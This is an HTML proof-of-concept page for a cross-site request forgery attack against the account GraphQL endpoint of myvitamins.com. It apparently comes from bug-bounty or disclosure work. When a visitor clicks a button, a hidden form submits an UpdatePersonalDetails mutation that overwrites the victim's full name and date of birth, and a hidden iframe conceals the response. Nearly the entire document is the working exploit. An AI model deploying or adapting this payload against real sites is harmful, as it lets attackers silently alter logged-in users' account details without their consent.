<!DOCTYPE html>
<html>
  <body>
    <h3>Iframe CSRF PoC</h3>

    <button onclick="document.getElementById('csrfForm').submit()">Click to launch CSRF via iframe</button>

    <form id="csrfForm" action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" target="csrf_frame" enctype="text/plain">
      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
        updateAccountSettings(input: $input) {
          error
          fieldErrors {
            fieldName
            validators
            requiredButNotProvided
            invalidOption
          }
        }
      }'>
      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"IframeCSRF"},{"fieldName":"dateOfBirth","value":"2001-01-01"}]}'>
    </form>

    <iframe name="csrf_frame" style="display: none;"></iframe>
  </body>
</html>
